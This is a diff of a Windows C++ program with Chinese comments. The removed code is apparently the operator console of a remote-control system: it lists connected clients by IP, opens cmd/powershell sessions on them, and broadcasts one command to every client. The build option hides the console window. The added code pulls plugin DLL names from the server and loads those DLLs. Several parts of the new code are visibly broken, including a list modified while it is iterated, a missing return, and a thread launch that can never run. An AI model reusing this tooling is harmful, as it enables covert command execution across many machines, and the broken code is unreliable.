@@ -1,8 +1,6 @@
-#pragma comment(lib, "ws2_32.lib")
+
 // 设置连接器选项
 #pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"")
-#include <winsock2.h>
-#include <ws2tcpip.h>
 #include <windows.h>
 #include <stdio.h>
 #include <iostream>
@@ -17,8 +15,9 @@
 #include <map>
 #include <queue>
 #include <string>
+#include "plugin.cpp"
 #include "..\\MD5.h"
-#include "hookClose.h"
+#include "..\\hookClose.h"
 using std::atomic;
 using std::cin;
 using std::cout;
@@ -35,23 +34,14 @@ using std::thread;
 using std::to_string;
 using std::vector;
 
-CloseCheak closeCheak;
-bool closeP = false;
-string serverIp;
-int serverPort;
-string password;
-SOCKET sockC, healthyBeat;
-sockaddr_in sockAddr, healthyBeatAddr;
-string SEID;
-bool ServerState = false;
-std::atomic<bool> ServerHealthCheck(false);
-void WhenClose();
-void SetColor(unsigned short forecolor = 4, unsigned short backgroudcolor = 0)
-{
-    HANDLE hCon = GetStdHandle(STD_OUTPUT_HANDLE);             // 获取缓冲区句柄
-    SetConsoleTextAttribute(hCon, forecolor | backgroudcolor); // 设置文本及背景色
-}
-bool send_message(SOCKET sock, const std::string &message)
+SOCKET g_sock = INVALID_SOCKET;
+sockaddr_in g_serverInfo = {0};
+vector<string> g_getFilesPathList, g_getFilesNameList;
+string g_SEID;
+string serverIP, serverPort;
+thread g_healthyThread;
+
+bool send_message(SOCKET &sock, const std::string &message)
 {
     std::ostringstream oss;
     oss << message.size() << "\r\n\r\n\r\n\r\n\r\n"
@@ -130,486 +120,222 @@ bool receive_message(SOCKET &sock, std::string &message)
 
     return true; // 接收成功
 }
-int sendClientList(SOCKET &s)
-{
-    int clientNum = 0;
-    cout << "__________Clients List__________" << endl;
-    cout << "WanIp\tLanIP\tClient Connect Port\tClient Satte\n";
-    do
-    {
-        string recvBuf;
-        receive_message(sockC, recvBuf);
-        if (strcmp(string(recvBuf).c_str(), "\r\n\r\nend\r\n\r\n") == 0)
-        {
-            break;
-        }
-        clientNum++;
-        string srecv = recvBuf;
-        istringstream iss(srecv);
-        string clientWanIp, clientLanIp, clientPort, clientState;
-        cout << clientNum;
-        iss >> clientWanIp >> clientLanIp >> clientPort >> clientState;
-        switch (stoi(clientState))
-        {
-        case 0:
-            cout << "\t" << clientWanIp << "\t" << clientLanIp << "\t" << clientPort << "\t" << "UnKnown" << endl;
-            break;
-        case 1:
-            cout << "\t" << clientWanIp << "\t" << clientLanIp << "\t" << clientPort << "\t" << "Online" << endl;
-            break;
-        case 2:
-            cout << "\t" << clientWanIp << "\t" << clientLanIp << "\t" << clientPort << "\t" << "Offline" << endl;
-            break;
-        case 3:
-            cout << "\t" << clientWanIp << "\t" << clientLanIp << "\t" << clientPort << "\t" << "Use" << endl;
-            break;
-        }
-    } while (1);
-    if (clientNum == 0)
-    {
-        cout << "No Clients\n";
-    }
-    cout << "__________Clients List__________" << endl;
-    cout << "Cin 0 to exit:";
-    return clientNum;
-}
-void coin(string couts, string &cins)
-{
-    cout << couts;
-    cin >> cins;
-    cin.ignore();
-    return;
-}
-void coin(string couts, int &cins)
-{
-    cout << couts;
-    cin >> cins;
-    cin.ignore();
-    return;
-}
-int initClient(SOCKET &s, sockaddr_in &sockAddr, string serverIp, int serverPort)
+int initClientSocket(SOCKET &sock, sockaddr_in &serverInfo, string serverIP, int serverPort)
 {
     WSADATA wsaData;
-    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+    int iResult;
+    // Initialize Winsock
+    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (iResult != 0)
     {
+        printf("WSAStartup failed: %d\n", iResult);
         return WSAGetLastError();
     }
-    s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-    if (s == INVALID_SOCKET)
+    // Create socket
+    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (sock == INVALID_SOCKET)
     {
+        printf("Error at socket(): %ld\n", WSAGetLastError());
+        WSACleanup();
         return WSAGetLastError();
     }
-    sockAddr.sin_family = AF_INET;
-    sockAddr.sin_port = htons(serverPort);
-    if (inet_pton(AF_INET, serverIp.c_str(), &sockAddr.sin_addr) <= 0)
-    {
-        return WSAGetLastError();
-    }
-    return -8192;
-}
-string StringTime(time_t t1)
-{
-    time_t t = t1;
-    char tmp[64];
-    struct tm *timinfo;
-    timinfo = localtime(&t);
+    // Set address and port
 
-    strftime(tmp, sizeof(tmp), "%Y%m%d%H%M", timinfo);
-    return tmp;
+    serverInfo.sin_family = AF_INET;
+    serverInfo.sin_addr.s_addr = inet_addr(serverIP.c_str());
+    serverInfo.sin_port = htons(serverPort);
+    return 0;
 }
-void healthyCheck(SOCKET HealthyBeat)
+int connectServer(SOCKET &sock, sockaddr_in &serverInfo)
 {
-    int timeout = 10000; // 设置超时时间为 10 秒
-    setsockopt(HealthyBeat, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout));
-    setsockopt(HealthyBeat, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout, sizeof(timeout));
-    while (1)
+    int iResult;
+    // Connect to server
+    iResult = connect(sock,
+                      (struct sockaddr *)&serverInfo,
+                      sizeof(serverInfo));
+    if (iResult == SOCKET_ERROR)
     {
-        if (closeP)
-        {
-            send_message(HealthyBeat, "\r\nClose\r\n");
-            closesocket(HealthyBeat);
-            return;
-        }
-        string buf;
-        int state = receive_message(HealthyBeat, buf);
-        if (closeP)
-        {
-            send_message(HealthyBeat, "\r\nClose\r\n");
-            closesocket(HealthyBeat);
-            return;
-        }
-        int state1 = send_message(HealthyBeat, buf);
-        if (state == SOCKET_ERROR || state1 == SOCKET_ERROR)
-        {
-            while (ServerHealthCheck.exchange(true, std::memory_order_acquire))
-                ;
-            ServerState = false;
-            ServerHealthCheck.exchange(false, std::memory_order_release);
-            return;
-        }
+        printf("Error at connect(): %ld\n", WSAGetLastError());
+        closesocket(g_sock);
+        WSACleanup();
     }
 }
-int login(SOCKET s)
+int initPlugin()
 {
+    getFilesName("plugins", g_getFilesNameList);
+    if (g_getFilesNameList.empty())
+        return -1;
+    for (auto pluginName : g_getFilesNameList)
+    {
+        string temp;
+        try
+        {
+            temp = pluginName.substr(0, pluginName.find("."));
+            temp = temp.substr(temp.find("\\"));
+        }
+        catch (...)
+        {
+            temp = pluginName;
+        }
+        g_getFilesNameList.push_back(temp);
+    }
 
-    string lastloginYZM;
-    string loginYZM;
-    lastloginYZM.clear();
-    bool loginTRUE = false;
-    MD5 m;
-    try
-    {
-        coin("password:", password);
-        for (int i = 1; i <= 5 && !loginTRUE; i++)
-        {
-            m.init();
-            string recvBuf;
-            string temp = StringTime(time(NULL)) + lastloginYZM + password;
-            loginYZM = m.encode(temp);
-            send_message(s, loginYZM);
-            receive_message(s, recvBuf);
-            if (recvBuf == "error")
-            {
-                coin("password:", password);
-                system("cls");
-                lastloginYZM = loginYZM;
-                continue;
-            }
-            else if (recvBuf == "true")
-            {
-                loginTRUE = true;
-                break;
-            }
-        }
-        if (!loginTRUE)
-            return 0;
-        string recvBuf;
-        receive_message(s, recvBuf);
-        SEID = recvBuf;
-        initClient(healthyBeat, healthyBeatAddr, serverIp, serverPort);
-        if (connect(healthyBeat, (sockaddr *)&healthyBeatAddr, sizeof(healthyBeatAddr)) == SOCKET_ERROR)
-        {
-            return 0;
-        }
-        else
-        {
-            ServerState = true;
-            return 1;
-        }
-    }
-    catch (std::exception &e)
-    {
-        cout << e.what() << endl;
-    }
+    return 0;
 }
-void Connect()
+int init(string serverIP, int serverPort)
 {
-    system("cls");
-    send_message(sockC, "connect");
-    string recvBuf;
-    string srecv, cmds;
-    int kb_cin = -1;
+    // value define
+    int iResult;
 
-    while (1)
+    // init plugin
+    iResult = initPlugin();
+    if (iResult != 0)
+        return iResult;
+
+    // init socket
+    iResult = initClientSocket(g_sock, g_serverInfo, serverIP, serverPort);
+    if (iResult != 0)
+        return iResult;
+
+    // connect server
+    iResult = connectServer(g_sock, g_serverInfo);
+    if (iResult != 0)
+        return iResult;
+
+    return 0;
+}
+int loadPlugin(vector<string> pluginList, string pluginType)
+{
+    int iResult = 0;
+    for (auto pluginName : pluginList)
     {
-        system("cls");
-        int clientNum = sendClientList(sockC);
-        if (_kbhit())
+        if (find(g_getFilesNameList.begin(),
+                 g_getFilesNameList.end(),
+                 pluginName) != g_getFilesNameList.end())
         {
-            cin >> kb_cin;
-            cin.ignore();
-            if (kb_cin == 0)
+            auto loadLibrary = LoadLibrary(("plugins\\" + pluginName + ".dll").c_str());
+            if (loadLibrary == NULL)
             {
-                send_message(sockC, "\r\nexit\r\n");
-                break;
-            }
-            if (kb_cin > 0 && kb_cin <= clientNum)
-            {
-                send_message(sockC, to_string(kb_cin));
-                receive_message(sockC, recvBuf);
-                if (strcmp(recvBuf.c_str(), "\r\n\r\nsec\r\n\r\n") == 0)
-                {
-                    system("cls");
-                    receive_message(sockC, recvBuf);
-                    if (recvBuf == "\r\n\r\nfail\r\n\r\n")
-                    {
-                        std::cerr << "UnKonwn ERROR!" << endl;
-                    }
-                    else if (recvBuf == "\r\n\r\nfailn\r\n\r\n")
-                    {
-                        receive_message(sockC, recvBuf);
-                    }
-                    cout << recvBuf;
-                    int qt = 1;
-                    while (1)
-                    {
-                        getline(cin, cmds);
-                        if (strcmp(cmds.c_str(), "powershell") == 0 || strcmp(cmds.c_str(), "cmd") == 0)
-                        {
-                            send_message(sockC, (cmds + "\n"));
-                            receive_message(sockC, recvBuf);
-                            if (recvBuf == "\r\n\r\nfail\r\n\r\n")
-                            {
-                                std::cerr << "UnKonwn ERROR!" << endl;
-                                break;
-                            }
-                            cout << recvBuf;
-                            send_message(sockC, "\r\n");
-                            receive_message(sockC, recvBuf);
-                            cout << recvBuf;
-
-                            qt++;
-                            continue;
-                        }
-                        else if (strcmp(cmds.c_str(), "exit") == 0)
-                        {
-                            qt--;
-                            if (qt == 0)
-                            {
-                                send_message(sockC, "\r\nfexit\r\n");
-                                break;
-                            }
-                        }
-                        else if (strcmp(cmds.c_str(), "cls") == 0)
-                        {
-                            system("cls");
-                        }
-                        send_message(sockC, (cmds + "\n"));
-                        receive_message(sockC, recvBuf);
-                        cout << recvBuf;
-                    }
-                }
-                else
-                {
-                    cout << "ERROR" << endl;
-                    system("pause");
-                }
+                iResult++;
             }
             else
             {
-                send_message(sockC, "\r\nnext\r\n");
+                auto statusFun = (startupFun_ptr)GetProcAddress(loadLibrary, "Startup");
+                auto startFun = (startFun_ptr)GetProcAddress(loadLibrary, "Start");
+                auto stopFun = (stopFun_ptr)GetProcAddress(loadLibrary, "Stop");
+                auto runFun = (runFun_ptr)GetProcAddress(loadLibrary, "run");
+                registerPlugin(pluginName, pluginType, statusFun, startFun, stopFun, runFun);
             }
         }
         else
         {
-            send_message(sockC, "\r\nnext\r\n");
+            iResult++;
         }
-        Sleep(500);
     }
+    return iResult;
 }
-void del()
+int pullOneClassPlugin(SOCKET &sock, vector<string> &pluginList)
 {
-    send_message(sockC, "del");
-    string recvBuf;
-    string srecv, cmds;
-    int kb_cin = -1;
-    int clientNum = 0;
-    while (1)
+    string message;
+    do
     {
-        system("cls");
-        sendClientList(sockC);
-        if (_kbhit())
+        receive_message(sock, message);
+        if (message.find("\r\nend\r\n") != string::npos)
+            break;
+        pluginList.push_back(message);
+    } while (true);
+    return 0;
+}
+// necessity: every bit: 0:unnecessity 1:necessary
+int pullPlugin(SOCKET &sock, string necessity, vector<string> pluginType)
+{
+    int loadFailedNum = 0;
+    int iResult = 0;
+
+    for (int i = 0; i < necessity.length(); i++)
+    {
+        vector<string> pluginListTemp;
+        iResult = pullOneClassPlugin(sock, pluginListTemp);
+        if (iResult != 0)
         {
-            cin >> kb_cin;
-            cin.ignore();
-            if (kb_cin == 0)
+            return -iResult;
+        }
+        if (necessity[i] == '0')
+        {
+            loadFailedNum += loadPlugin(pluginListTemp, pluginType[i]);
+        }
+        else
+        {
+            iResult = loadPlugin(pluginListTemp, pluginType[i]);
+            if (iResult != 0)
             {
-                send_message(sockC, "\r\nexit\r\n");
-                break;
-            }
-            if (kb_cin > 0 && kb_cin <= clientNum)
-            {
-                send_message(sockC, to_string(kb_cin));
-                receive_message(sockC, recvBuf);
-                if (strcmp(recvBuf.c_str(), "\r\n\r\nUse\r\n\r\n") == 0)
-                {
-                    cout << "It was Use" << endl;
-                    system("pause");
-                }
-                else if (strcmp(recvBuf.c_str(), "\r\n\r\nUnError\r\n\r\n") == 0)
-                {
-                    cout << "UnError" << endl;
-                    system("pause");
-                }
+                return -iResult;
             }
         }
-        else
-        {
-            send_message(sockC, "\r\nnext\r\n");
-        }
-        Sleep(500);
     }
+    return loadFailedNum;
 }
-void show()
+void healthyCheck(string SEID)
 {
-    send_message(sockC, "show");
-    char recvBuf[8192] = {0};
-    string srecv, cmds;
-    int kb_cin = -1;
-    int clientNum = 0;
-    while (1)
-    {
-        clientNum = 0;
-        system("cls");
-        sendClientList(sockC);
-        if (_kbhit())
-        {
-            getch();
-            send_message(sockC, "\r\nclose\r\n");
-            break;
-        }
-        else
-        {
-            send_message(sockC, "\r\nnext\r\n");
-        }
-        Sleep(500);
-    }
+    SOCKET sock;
+    sockaddr_in serverInfo;
+    int iResult = initClientSocket(sock, serverInfo, serverIP, std::stoi(serverPort));
+    if (iResult != 0)
+        return;
+    iResult = connectServer(sock, serverInfo);
+    if (iResult != 0)
+        return;
+    send_message(sock, SEID);
 }
-void cmd()
+int handshake(SOCKET &sock)
 {
-    char cinBuf[8192] = {0};
-    string recvInfo1;
-    string recvInfo2;
-    string recvBuf;
-    string cmds;
-    while (1)
+    // send id
+    send_message(sock, "Server");
+
+    // load plugin
+    int iResultPlugin = pullPlugin(sock, "0111", {"fun", "srd", "sonline", "sRSstart"});
+    if (iResultPlugin < 0)
     {
-        memset(cinBuf, 0, sizeof(cinBuf));
-        cout << "Entry \"exit\" to exit:";
-        cin.getline(cinBuf, 8191);
-        cmds = cinBuf;
-        if (strcmp(cmds.c_str(), "exit") == 0)
-        {
-            break;
-        }
-        send_message(sockC, ("cmd " + cmds));
-        recvBuf.clear();
-        receive_message(sockC, recvBuf);
-        if (strcmp(recvBuf.c_str(), "\r\nsee\r\n") == 0)
-        {
-            sendClientList(sockC);
-        }
-        recvBuf.clear();
-        receive_message(sockC, recvBuf);
-        if (strcmp(recvBuf.c_str(), "\r\nok\r\n") == 0)
-        {
-            receive_message(sockC, recvInfo1);
-            receive_message(sockC, recvInfo2);
-            SetColor(10, 0); // green
-            cout << "Command executed successfully127" << endl;
-            cout << "Number of Client: " << recvInfo2 << endl;
-            cout << "Number of clients successfully executing instructions: " << recvInfo1 << endl;
-            SetColor(15, 0); // white
-        }
-        else if (strcmp(recvBuf.c_str(), "\r\ncmd error\r\n") == 0)
-        {
-            SetColor(4, 0); // red
-            cout << "Command Error or Server Error!" << endl;
-            SetColor(15, 0); // white
-        }
+        return iResultPlugin;
     }
-}
-void pageShow()
-{
-    while (ServerState && !closeP)
+    else
     {
-        int choose;
-        cout << "1.Connect" << endl
-             << "2.del Client" << endl
-             << "3.show all Clients" << endl
-             << "4.cmd" << endl
-             << "5.exit" << endl
-             << "Choose:";
-        cin >> choose;
-        cin.ignore();
-        system("cls");
-        switch (choose)
-        {
-        case 1:
-            Connect(); // ok
-            break;
-        case 2:
-            del(); // ok
-            break;
-        case 3:
-            show();
-            break;
-        case 4:
-            cmd();
-            break;
-        case 5:
-            WhenClose();
-            break;
-        }
-        system("cls");
+        return iResultPlugin;
     }
-    closesocket(sockC);
-}
-thread healthyCheckThread;
-thread pageShowThread;
-void WhenClose()
-{
-    try
-    {
-        healthyCheckThread.detach();
-        pageShowThread.detach();
-    }
-    catch (std::exception &e)
-    {
-        MessageBox(NULL, e.what(), "Error", MB_OK);
-    }
-    closeP = true;
-    send_message(healthyBeat, "\r\nClose\r\n");
-    send_message(sockC, "\r\nClose\r\n");
-    closesocket(healthyBeat);
-    closesocket(sockC);
-    return;
+
+    // create healthy check thread
+    receive_message(sock, g_SEID);
+    g_healthyThread = thread(healthyCheck, g_SEID);
 }
 int main()
 {
-    system("chcp 65001>nul");
-    do
+    cin >> serverIP >> serverPort;
+    int iResult = init(serverIP, std::stoi(serverPort));
+    if (iResult != 0)
     {
-        serverIp.clear();
-        serverPort = 0;
-        coin("ip: ", serverIp);
-        coin("port: ", serverPort);
-        system("cls");
-    } while (initClient(sockC, sockAddr, serverIp, serverPort) != -8192);
-    if (connect(sockC, (sockaddr *)&sockAddr, sizeof(sockAddr)) == SOCKET_ERROR)
-    {
-        return WSAGetLastError();
+        cout << "init failed" << endl
+             << "error code " << iResult
+             << endl;
+        system("pause");
+        return iResult;
     }
-    string recvBuf;
-    send_message(sockC, "Server");
-    receive_message(sockC, recvBuf);
-    if (recvBuf != "OK")
+    iResult = connectServer(g_sock, g_serverInfo);
+    if (iResult != 0)
     {
-        return -2048;
+        cout << "connect failed" << endl
+             << "error code " << iResult
+             << endl;
+        system("pause");
+        return iResult;
     }
-    if (!login(sockC))
+
+    iResult = handshake(g_sock);
+    if (iResult < 0)
     {
-        return -4096;
-    }
-    send_message(healthyBeat, SEID.c_str());
-    healthyCheckThread = thread(healthyCheck, healthyBeat);
-    pageShowThread = thread(pageShow);
-    closeCheak.setRunFun((void *)WhenClose, (void *)WhenClose, (void *)WhenClose, (void *)WhenClose, (void *)WhenClose);
-    closeCheak.startHook();
-    while (1)
-    {
-        if (closeP)
-        {
-            return 0;
-        }
-        while (ServerHealthCheck.exchange(true, std::memory_order_acquire))
-            ;
-        if (ServerState == false)
-        {
-            healthyCheckThread.detach();
-            pageShowThread.detach();
-            return -16384;
-        }
-        ServerHealthCheck.exchange(false, std::memory_order_release);
+        cout << "handshake failed" << endl
+             << "error code " << iResult
+             << endl;
+        system("pause");
+        return iResult;
     }
 }
